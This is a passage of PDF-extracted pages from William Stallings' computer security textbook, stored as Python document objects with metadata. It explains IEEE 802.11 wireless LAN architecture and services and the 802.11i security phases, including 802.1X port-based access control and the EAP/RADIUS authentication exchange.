       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 733, 'page_label': '732'}, page_content='732  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nbit transmission/reception. In addition, the physical layer includes a specification of \\nthe transmission medium. In the case of IEEE 802.11, the physical layer also defines \\nfrequency bands and antenna characteristics.\\nmedium acceSS conTrol All LANs consist of collections of devices that share the \\nnetwork’s transmission capacity. Some means of controlling access to the  transmission \\nmedium is needed to provide an orderly and efficient use of that capacity. This is the \\nfunction of a medium access control (MAC) layer. The MAC layer receives data from \\na higher-layer protocol, typically the logical link control (LLC) layer, in the form of \\na block of data known as the MAC service data unit (MSDU). In general, the MAC \\nlayer performs the following functions:\\n• On transmission, assemble data into a frame, known as a MAC protocol data \\nunit (MPDU) with address and error-detection fields.\\n• On reception, disassemble frame, and perform address recognition and error \\ndetection.\\n• Govern access to the LAN transmission medium.\\nThe exact format of the MPDU differs somewhat for the various MAC proto-\\ncols in use. In general, all of the MPDUs have a format similar to that of Figure 24.4. \\nThe fields of this frame are as follows:\\n• MAC Control: This field contains any protocol control information needed for \\nthe functioning of the MAC protocol. For example, a priority level could be \\nindicated here.\\nFigure 24.3 IEEE 802.11 Protocol Stack\\nLogical Link\\nControl\\nMedium Access\\nControl\\nPhysical\\nEncoding/decoding\\nof signals\\nBit transmission/\\nreception\\nTransmission medium\\nAssemble data\\ninto frame\\nAddressing\\nError detection\\nMedium access\\nFlow control\\nError control\\nGeneral IEEE 802\\nfunctions\\nSpeciﬁc IEEE 802.11\\nfunctions\\nFrequency band\\ndeﬁnition\\nWireless signal\\nencoding\\nReliable data delivery\\nWireless access control\\nprotocols\\nM24_STAL0611_04_GE_C24.indd   732 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 734, 'page_label': '733'}, page_content='24.3 / IEEE 802.11 WIRELESS LAN oVERVIEW  733\\n• Destination MAC Address: The destination physical address on the LAN for \\nthis MPDU.\\n• Source MAC Address: The source physical address on the LAN for this MPDU.\\n• MAC Service Data Unit: The data from the next higher layer.\\n• CRC: The cyclic redundancy check field, also known as the Frame Check \\nSequence (FCS) field. This is an error-detecting code, such as that which is used \\nin other data-link control protocols. The CRC is calculated based on the bits in \\nthe entire MPDU. The sender calculates the CRC and adds it to the frame. The \\nreceiver performs the same calculation on the incoming MPDU and compares \\nthat calculation to the CRC field in that incoming MPDU. If the two values do \\nnot match, then one or more bits have been altered in transit.\\nThe fields preceding the MSDU field are referred to as the MAC header, and \\nthe field following the MSDU field is referred to as the MAC trailer. The header and \\ntrailer contain control information that accompany the data field and that are used \\nby the MAC protocol.\\nlogical  link conTrol In most data-link control pr otocols, the data-link \\n protocol entity is r esponsible not only for detecting errors using the CRC, but for \\n recovering from those errors by retransmitting damaged frames. In the LAN protocol \\n architecture, these two functions are split between the MAC and LLC layers. The \\nMAC layer is responsible for detecting errors and discarding any frames that contain \\nerrors. The LLC layer optionally keeps track of which frames have been successfully \\nreceived and retransmits unsuccessful frames.\\nIEEE 802.11 Network Components and Architectural Model\\nFigure 24.5 illustrates the model developed by the 802.11 working group. The  smallest \\nbuilding block of a wireless LAN is a basic service set (BSS), which consists of wire-\\nless stations executing the same MAC protocol and competing for access to the same \\nshared wireless medium. A BSS may be isolated or it may connect to a backbone \\n distribution system (DS) through an access point (AP). The AP functions as a bridge \\nand a relay point. In a BSS, client stations do not communicate directly with one \\nanother. Rather, if one station in the BSS wants to communicate with another  station \\nin the same BSS, the MAC frame is first sent from the originating station to the AP , \\nthen from the AP to the destination station. Similarly, a MAC frame from a station \\nin the BSS to a remote station is sent from the local station to the AP then relayed \\nby the AP over the DS on its way to the destination station. The BSS generally cor-\\nresponds to what is referred to as a cell in the literature. The DS can be a switch, a \\nwired network, or a wireless network.\\nFigure 24.4 General IEEE 802 MPDU Format\\nMAC\\nControl\\nMAC header MAC trailer\\nDestination\\nMAC Address\\nSource\\nMAC Address MAC Service Data Unit (MSDU) CRC\\nM24_STAL0611_04_GE_C24.indd   733 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 735, 'page_label': '734'}, page_content='734  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nWhen all the stations in the BSS are mobile stations that communicate directly \\nwith one another (not using an AP) the BSS is called an independent BSS (IBSS). \\nAn IBSS is typically an ad hoc network. In an IBSS, the stations all communicate \\ndirectly, and no AP is involved.\\nA simple configuration is shown in Figure 24.5, in which each station belongs to \\na single BSS; that is, each station is within wireless range only of other stations within \\nthe same BSS. It is also possible for two BSSs to overlap geographically, so that a \\nsingle station could participate in more than one BSS. Furthermore, the association \\nbetween a station and a BSS is dynamic. Stations may turn off, come within range, \\nand go out of range.\\nAn extended service set (ESS) consists of two or more basic service sets inter-\\nconnected by a distribution system. The ESS appears as a single logical LAN to the \\nLLC level.\\nIEEE 802.11 Services\\nIEEE 802.11 defines nine services that need to be provided by the wireless LAN to \\nachieve functionality equivalent to that which is inherent to wired LANs. Table 24.2 \\nlists the services and indicates two ways of categorizing them.\\n1. The service provider can be either the station or the DS. Station services are \\nimplemented in every 802.11 station, including AP stations. Distribution ser -\\nvices are provided between BSSs; these services may be implemented in an AP , \\nor in another special-purpose device attached to the distribution system.\\nFigure 24.5 IEEE 802.11 Extended Service Set\\nSTA 2\\nSTA 3\\nSTA 4 \\nSTA 1\\nSTA 6 STA 7\\nSTA 8\\nAP 2\\nAP 1\\nBasic Service\\nSet (BSS)\\nBasic Service\\nSet (BSS)\\nDistribution System\\nM24_STAL0611_04_GE_C24.indd   734 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 736, 'page_label': '735'}, page_content='24.3 / IEEE 802.11 WIRELESS LAN oVERVIEW  735\\n2. Three of the services are used to control IEEE 802.11 LAN access and \\n confidentiality. Six of the services are used to support delivery of MSDUs \\nbetween stations. If the MSDU is too large to be transmitted in a single MPDU, \\nit may be fragmented and transmitted in a series of MPDUs.\\nFollowing the IEEE 802.11 document, we next discuss the services in an order \\ndesigned to clarify the operation of an IEEE 802.11 ESS network. MSDU delivery, \\nwhich is the basic service, has already been mentioned. Services related to security \\nare introduced in Section 24.3.\\ndiSTribuTion of meSSageS WiThin a dS The two services involved with the \\n distribution of messages within a DS are distribution and integr ation. Distribution \\nis the primary service used by stations to exchange MPDUs when the MPDUs must \\ntraverse the DS to get from a station in one BSS to a station in another BSS. For \\nexample, suppose a frame is to be sent from station 2 (STA 2) to station 7 (STA 7) \\nin Figure 24.5. The frame is sent from STA 2 to AP 1, which is the AP for this BSS. \\nThe AP gives the frame to the DS, which has the job of directing the frame to the AP \\nassociated with STA 7 in the target BSS. AP 2 receives the frame and forward it to \\nSTA 7 . How the message is transported through the DS is beyond the scope of the \\nIEEE 802.11 standard.\\nIf the two stations that are communicating are within the same BSS, then the \\ndistribution service logically goes through the single AP of that BSS.\\nThe integration service enables transfer of data between a station on an IEEE \\n802.11 LAN and a station on an integrated IEEE 802.x LAN. The term integrated \\nrefers to a wired LAN that is physically connected to the DS and whose stations \\nmay be logically connected to an IEEE 802.11 LAN via the integration service. The \\nintegration service takes care of any address translation and media conversion logic \\nrequired for the exchange of data.\\naSSociaTion-relaTed ServiceS The primary purpose of the MAC layer is to \\ntransfer MSDUs between MAC entities; this purpose is fulfilled by the distribu -\\ntion service. For that service to function, it requires information about stations \\nService Provider Used to support\\nAssociation Distribution system MSDU delivery\\nAuthentication Station LAN access and security\\nDeauthentication Station LAN access and security\\nDisassociation Distribution system MSDU delivery\\nDistribution Distribution system MSDU delivery\\nIntegration Distribution system MSDU delivery\\nMSDU delivery Station MSDU delivery\\nPrivacy Station LAN access and security\\nReassociation Distribution system MSDU delivery\\nTable 24.2 IEEE 802.11 Services\\nM24_STAL0611_04_GE_C24.indd   735 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 737, 'page_label': '736'}, page_content='736  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nwithin the ESS that is provided by the association-related services. Before the dis -\\ntribution  service can deliver data to or accept data from a station, that station must \\nbe  associated. Before looking at the concept of association, we need to describe \\nthe concept of mobility. The standard defines three transition types, based on  \\nmobility:\\n• No transition: A station of this type is either stationary, or moves only within \\nthe direct communication range of the communicating stations of a single BSS.\\n• BSS transition: This is defined as a station movement from one BSS to another \\nBSS within the same ESS. In this case, delivery of data to the station requires \\nthat the addressing capability be able to recognize the new location of the \\nstation.\\n• ESS transition: This is defined as a station movement from a BSS in one ESS \\nto a BSS within another ESS. This case is supported only in the sense that the \\nstation can move. Maintenance of upper-layer connections supported by 802.11 \\ncannot be guaranteed. In fact, disruption of service is likely to occur.\\nTo deliver a message within a DS, the distribution service needs to know \\nwhere the destination station is located. Specifically, the DS needs to know the iden-\\ntity of the AP to which the message should be delivered in order for that message \\nto reach the destination station. To meet this requirement, a station must maintain \\nan association with the AP within its current BSS. Three services relate to this \\nrequirement:\\n• Association: Establishes an initial association between a station and an AP . \\nBefore a station can transmit or receive frames on a wireless LAN, its identity \\nand address must be known. For this purpose, a station must establish an asso-\\nciation with an AP within a particular BSS. The AP can then communicate this \\ninformation to other APs within the ESS to facilitate routing and delivery of \\naddressed frames.\\n• Reassociation: Enables an established association to be transferred from one \\nAP to another, allowing a mobile station to move from one BSS to another.\\n• Disassociation: A notification from either a station or an AP that an existing \\nassociation is terminated. A station should give this notification before leaving \\nan ESS or shutting down. However, the MAC management facility protects \\nitself against stations that disappear without notification.\\n 24.4 IEEE 802.11i WIRELESS LAN SECURITY\\nThere are two characteristics of a wired LAN that are not inherent in a wireless LAN.\\n1. In order to transmit over a wired LAN, a station must be physically connected \\nto the LAN. On the other hand, with a wireless LAN, any station within radio \\nrange of the other devices on the LAN can transmit. In a sense, there is a form \\nof authentication with a wired LAN, in that it requires some positive and pre-\\nsumably observable action to connect a station to a wired LAN.\\nM24_STAL0611_04_GE_C24.indd   736 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 738, 'page_label': '737'}, page_content='24.4 / IEEE 802.11i WIRELESS LAN SECURITY  737\\n2. Similarly, in order to receive a transmission from a station that is part of a wired \\nLAN, the receiving station also must be attached to the wired LAN. On the \\nother hand, with a wireless LAN, any station within radio range can receive. \\nThus, a wired LAN provides a degree of privacy, limiting reception of data to \\nstations connected to the LAN.\\nThese differences between wired and wireless LANs suggest the increased need \\nfor robust security services and mechanisms for wireless LANs. The original 802.11 \\nspecification included a set of security features for privacy and authentication that \\nwere quite weak. For privacy, 802.11 defined the Wired Equivalent Privacy (WEP) \\nalgorithm. The privacy portion of the 802.11 standard contained major weaknesses. \\nSubsequent to the development of WEP , the 802.11i task group has developed a \\nset of capabilities to address the WLAN security issues. In order to accelerate the \\nintroduction of strong security into WLANs, the Wi-Fi Alliance promulgated Wi-Fi \\nProtected Access (WPA) as a Wi-Fi standard. WPA is a set of security mechanisms \\nthat eliminates most 802.11 security issues and was based on the current state of \\nthe 802.11i standard. The final form of the 802.11i standard is referred to as Robust \\nSecurity Network (RSN). The Wi-Fi Alliance certifies vendors in compliance with the \\nfull 802.11i specification under the WPA2 program.\\nIEEE 802.11i Services\\nThe 802.11i RSN security specification defines the following services:\\n• Authentication: A protocol is used to define an exchange between a user and an \\nAS (authentication server) that provides mutual authentication and generates \\ntemporary keys to be used between the client and the AP over the wireless link.\\n• Access control1: This function enforces the use of the authentication function, \\nroutes the messages properly, and facilitates key exchange. It can work with a \\nvariety of authentication protocols.\\n• Privacy with message integrity:  MAC-level data (e.g., an LLC PDU) are \\nencrypted along with a message integrity code that ensures that the data have \\nnot been altered.\\nFigure 24.6a indicates the security protocols used to support these services, \\nwhile Figure 24.6b lists the cryptographic algorithms used for these services.\\nIEEE 802.11i Phases of Operation\\nThe operation of an IEEE 802.11i RSN can be broken down into five distinct phases. \\nThe exact nature of the phases will depend on the configuration and the end points \\nof the communication. Possibilities include (see Figure 24.5):\\n1. Two wireless stations in the same BSS communicating via the access point for \\nthat BSS.\\n1In this context, we are discussing access control as a security function. This is a different function than \\nmedium access control, as described in Section 24.2. Unfortunately, the literature and the standards use \\nthe term access control in both contexts.\\nM24_STAL0611_04_GE_C24.indd   737 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 739, 'page_label': '738'}, page_content='738  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n2. Two wireless stations (STAs) in the same ad hoc IBSS communicating directly \\nwith each other.\\n3. Two wireless stations in different BSSs communicating via their respective APs \\nacross a distribution system.\\n4. A wireless station communicating with an end station on a wir ed network via \\nits AP and the distribution system.\\nIEEE 802.11i security is concerned only with secure communication between \\nthe STA and its AP . In case 1 in the preceding list, secure communication is assured if \\neach STA establishes secure communications with the AP . Case 2 is similar, with the \\nAP functionality residing in the STA. For case 3, security is not provided across the \\nFigure 24.6 Elements of IEEE 802.11i ServicesProtocols\\nAccess Control\\nIEEE 802.1\\nPort-based\\nAccess Control\\nExtensible\\nAuthentication\\nProtocol (EAP)\\nAuthentication\\nand Key\\nGeneration\\n(a) Services and Protocols\\nConﬁdentiality, Data\\nOrigin Authentication\\nand Integrity and\\nReplay Protection\\nTKIP CCMP\\nRobust Security Network (RSN)\\n(b) Cryptographic Algorithms\\nRobust Security Network (RSN)\\nTKIP\\n(Michael\\nMIC)\\nCCM\\n(AES-\\nCBC-\\nMAC)\\nHMAC-\\nMD5\\nHMAC-\\nSHA-1\\nIntegrity and\\nData Origin\\nAuthentication\\nServicesAlgorithms\\nConﬁdentiality\\nCCM\\n(AES-\\nCTR)\\nNIST\\nKey\\nWrap\\nTKIP\\n(RC4)\\nKey\\nGeneration\\nHMAC-\\nSHA-1\\nRFC\\n1750\\nCBC-MAC = Cipher Block Chaining Message Authentication Code (MAC)\\nCCM = Counter Mode with Cipher Block Chaining Message Authentication Code \\nCCMP = Counter Mode with Cipher Block Chaining MAC Protocol\\nTKIP = Temporal Key Integrity Protocol\\nM24_STAL0611_04_GE_C24.indd   738 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 740, 'page_label': '739'}, page_content='distribution system at the level of IEEE 802.11, but only within each BSS.  End-to-end \\nsecurity (if required) must be provided at a higher layer. Similarly, in case 4, security \\nis only provided between the STA and its AP .\\nWith these considerations in mind, Figure 24.7 depicts the five phases of opera-\\ntion for an RSN and maps them to the network components involved. One new \\ncomponent is the authentication server (AS). The rectangles indicate the exchange \\nof sequences of MPDUs. The five phases are defined as follows:\\n• Discovery: An AP uses messages called Beacons and Probe Responses to \\nadvertise its IEEE 802.11i security policy. The STA uses these to identify an \\nAP for a WLAN with which it wishes to communicate. The STA associates with \\nthe AP , which it uses to select the cipher suite and authentication mechanism \\nwhen the Beacons and Probe Responses present a choice.\\n• Authentication: During this phase, the STA and AS prove their identities to each \\nother. The AP blocks nonauthentication traffic between the STA and AS until \\nthe authentication transaction is successful. The AP does not participate in the \\nauthentication transaction other than forwarding traffic between the STA and AS.\\n• Key Management: The AP and the STA perform several operations that cause \\ncryptographic keys to be generated and placed on the AP and the STA. Frames \\nare exchanged only between the AP and STA.\\nFigure 24.7 IEEE 802.11i Phases of Operation\\nPhase 1 – Discovery\\nSTA AP AS End Station\\nPhase 5 – Connection Termination\\nPhase 3 – Key Management\\nPhase 4 – Protected Data Transfer\\nPhase 2 – Authentication\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  739\\nM24_STAL0611_04_GE_C24.indd   739 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 741, 'page_label': '740'}, page_content='740  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n• Protected data transfer: Frames are exchanged between the STA and the end \\nstation through the AP . As denoted by the shading and the encryption module \\nicon, secure data transfer occurs between the STA and the AP only; security is \\nnot provided end-to-end.\\n• Connection termination: The AP and STA exchange frames. During this phase, \\nthe secure connection is torn down and the connection is restored to the  original \\nstate.\\nDiscovery Phase\\nWe now look in more detail at the RSN phases of operation, beginning with the \\ndiscovery phase, which is illustrated in the upper portion of Figure 24.8. The purpose \\nFigure 24.8 IEEE 802.11i Phases of Operation: Capability Discovery, \\nAuthentication, and Association\\nSTA AP AS\\nProbe requestStation sends a request\\nto join network AP sends possible\\nsecurity parameter\\n(security capabilties set\\nper the security policy)\\nAP performs\\nnull authentication\\nAP sends the associated\\nsecurity parameters\\nStation sends a\\nrequest to perform\\n null authentication\\nStation sends a request to\\nassociate with AP with\\nsecurity parameters\\nStation sets selected\\nsecurity parameters\\nOpen system\\nauthentication request\\nProbe response\\n802.1x EAP request\\nAccess request\\n(EAP request)\\n802.1x EAP response\\nAccept/EAP-success\\nkey material\\n802.1x EAP success\\nAssociation request\\nAssociation response\\n Open system\\nauthentication  response\\n802.1X controlled port blocked\\n802.1X controlled port blocked\\nExtensible Authentication Protocol Exchange\\nM24_STAL0611_04_GE_C24.indd   740 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 742, 'page_label': '741'}, page_content='of this phase is for an STA and an AP to recognize each other, agree on a set of secu-\\nrity capabilities, and establish an association for future communication using those \\nsecurity capabilities.\\nSecuriTy caPabiliTieS During this phase, the STA and AP decide on specific \\n techniques in the following areas:\\n• Confidentiality and MPDU integrity pr otocols for protecting unicast traffic \\n(traffic only between this STA and AP)\\n• Authentication method\\n• Cryptography key management approach\\nConfidentiality and integrity protocols for protecting multicast/broadcast traffic \\nare dictated by the AP , since all STAs in a multicast group must use the same proto-\\ncols and ciphers. The specification of a protocol, along with the chosen key length (if \\nvariable), is known as a cipher suite. The options for the confidentiality and integrity \\ncipher suite are:\\n• WEP , with either a 40-bit or 104-bit key, which allows backward compatibility \\nwith older IEEE 802.11 implementations\\n• TKIP\\n• CCMP\\n• Vendor-specific methods\\nThe other negotiable suite is the authentication and key management (AKM) \\nsuite, which defines (1) the means by which the AP and STA perform mutual authen-\\ntication and (2) the means for deriving a root key from which other keys may be \\ngenerated. The possible AKM suites are:\\n• IEEE 802.1X\\n• Pre-shared key (no explicit authentication takes place and mutual authentica-\\ntion is implied if the STA and AP share a unique secret key)\\n• Vendor-specific methods\\nmPdu exchange The discovery phase consists of three exchanges:\\n• Network and security c apability discovery:  During this exchange, STAs \\n discover the existence of a network with which to communicate. The AP either \\n periodically broadcasts its security capabilities (not shown in figure), indicated \\nby RSN IE (Robust Security Network Information Element), in a specific \\n channel through the Beacon fr ame; or responds to a station’s Probe Request \\nthrough a Probe Response frame. A wireless station may discover available \\naccess points and corresponding security capabilities by either passively moni-\\ntoring the Beacon frames or actively probing every channel.\\n• Open system authentication: The purpose of this frame sequence, which pro -\\nvides no security, is simply to maintain backward compatibility with the IEEE \\n802.11 state machine, as implemented in existing IEEE 802.11 hardware. In \\nessence, the two devices (STA and AP) simply exchange identifiers.\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  741\\nM24_STAL0611_04_GE_C24.indd   741 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 743, 'page_label': '742'}, page_content='742  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n• Association: The purpose of this stage is to agree on a set of security capabilities \\nto be used. The STA then sends an Association Request frame to the AP . In this \\nframe, the STA specifies one set of matching capabilities (one authentication \\nand key management suite, one pairwise cipher suite, and one group-key cipher \\nsuite) from among those advertised by the AP . If there is no match in capa -\\nbilities between the AP and the STA, the AP refuses the Association Request. \\nThe STA blocks it too, in case it has associated with a rogue AP or someone \\nis inserting frames illicitly on its channel. As shown in Figure 24.8, the IEEE \\n802.1X controlled ports are blocked, and no user traffic goes beyond the AP . \\nThe concept of blocked ports is explained subsequently.\\nAuthentication Phase\\nAs was mentioned, the authentication phase enables mutual authentication between \\nan STA and an authentication server located in the DS. Authentication is designed \\nto allow only authorized stations to use the network and to provide the STA with \\nassurance that it is communicating with a legitimate network.\\nieee 802.1x acceSS conTrol aPProach IEEE 802.11i makes use of another \\nstandard that was designed to provide access control functions for LANs. The \\n standard is IEEE 802.1X, Port-Based Network Access Control. The authentication \\nprotocol that is used, the Extensible Authentication Protocol (EAP), is defined in \\nthe IEEE 802.1X standard. IEEE 802.1X uses the terms supplicant, authenticator, \\nand authentication server . In the context of an 802.11 WLAN, the first two terms \\ncorrespond to the wireless station and the AP . The AS is typically a separate device \\non the wired side of the network (i.e., accessible over the DS) but could also reside \\ndirectly on the authenticator.\\nUntil the AS authenticates a supplicant (using an authentication protocol), the \\nauthenticator only passes control and authentication messages between the suppli -\\ncant and the AS; the 802.1X control channel is unblocked, but the 802.11 data channel \\nis blocked. Once a supplicant is authenticated and keys are provided, the authen -\\nticator can forward data from the supplicant, subject to predefined access control \\nlimitations for the supplicant to the network. Under these circumstances, the data \\nchannel is unblocked.\\nAs indicated in Figure 24.9, 802.1X uses the concepts of controlled and uncon-\\ntrolled ports. Ports are logical entities defined within the authenticator and refer to \\nphysical network connections. For a WLAN, the authenticator (the AP) may have \\nonly two physical ports: one connecting to the DS, and one for wireless communica-\\ntion within its BSS. Each logical port is mapped to one of these two physical ports. \\nAn uncontrolled port allows the exchange of PDUs between the supplicant and the \\nother AS, regardless of the authentication state of the supplicant. A controlled port \\nallows the exchange of PDUs between a supplicant and other systems on the LAN \\nonly if the current state of the supplicant authorizes such an exchange.\\nThe 802.1X framework, with an upper-layer authentication protocol, fits \\nnicely with a BSS architecture that includes a number of wireless stations and an \\nAP . However, for an IBSS, there is no AP . For an IBSS, 802.11i provides a more com-\\nplex solution that, in essence, involves pairwise authentication between stations on  \\nthe IBSS.\\nM24_STAL0611_04_GE_C24.indd   742 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 744, 'page_label': '743'}, page_content='mPdu exchange The lower part of Figure 24.8 shows the MPDU exchange \\n dictated by IEEE 802.11 for the authentication phase. We can think of  authentication \\nphase as consisting of the following three phases.\\n• Connect to AS: The STA sends a request to its AP (the one with which it has an \\nassociation) for connection to the AS. The AP acknowledges this request and \\nsends an access request to the AS.\\n• EAP exchange: This exchange authenticates the STA and AS to each other. \\nA\\xa0number of alternative exchanges are possible, as explained subsequently.\\n• Secure key delivery: Once authentication is established, the AS generates a mas-\\nter session key (MSK), also known as the Authentication, Authorization, and \\nAccounting (AAA) key, and sends it to the STA. As explained subsequently, all \\nthe cryptographic keys needed by the STA for secure communication with its \\nAP are generated from this MSK. IEEE 802.11i does not prescribe a method \\nfor secure delivery of the MSK but relies on EAP for this. Whatever method is \\nused, it involves the transmission of an MPDU containing an encrypted MSK \\nfrom the AS, via the AP , to the AS.\\neaP exchange As mentioned, ther e are a number of possible EAP exchanges \\nthat can be used during the authentication phase. Typically, the message flow between \\nSTA and AP employs the EAP over LAN (EAPOL) protocol, and the message \\nflow between the AP and AS uses the Remote Authentication Dial In User Service \\n(RADIUS) protocol, although other options are available for both STA-to-AP and \\nAP-to-AS exchanges. NIST SP 800-97 ( Establishing Wireless Robust Security Net -\\nworks: A Guide to IEEE 802.11i, February 2007) provides the following summary of \\nthe authentication exchange using EAPOL and RADIUS.\\n1. The EAP exchange begins with the AP issuing an EAP-Request/Identity frame \\nto the STA.\\nFigure 24.9 802.1X Access Control\\nStation\\nAccess point\\nUncontrolled\\nport\\nControlled\\nport\\nControlled\\nport\\nTo DS\\nTo other\\nwireless stations\\non this BSS\\nAuthentication server\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  743\\nM24_STAL0611_04_GE_C24.indd   743 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 745, 'page_label': '744'}, page_content='744  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n2. The STA replies with an EAP-Response/Identity frame, which the AP receives \\nover the uncontrolled port. The packet is then encapsulated in RADIUS over \\nEAP and passed on to the RADIUS server as a RADIUS-Access-Request \\npacket.\\n3. The AAA server replies with a RADIUS-Access-Challenge packet, which is \\nthen passed on to the STA as an EAP-Request. This request is of the appropriate \\nauthentication type and contains relevant challenge information.\\n4. The STA formulates an EAP-Response message and sends it to the AS. The \\nresponse is translated by the AP into a Radius-Access-Request with the response \\nto the challenge as a data field. Steps 3 and 4 may be repeated multiple times, \\ndepending on the EAP method in use. For TLS tunneling methods, it is common \\nfor authentication to require 10–20 round trips.\\n5. The AAA server grants access with a Radius-Access-Accept packet. The AP \\nissues an EAP-Success frame. (Some protocols require confirmation of the \\nEAP success inside the TLS tunnel for authenticity validation.) The controlled \\nport is authorized, and the user may begin to access the network.\\nNote from Figure 24.8 that the 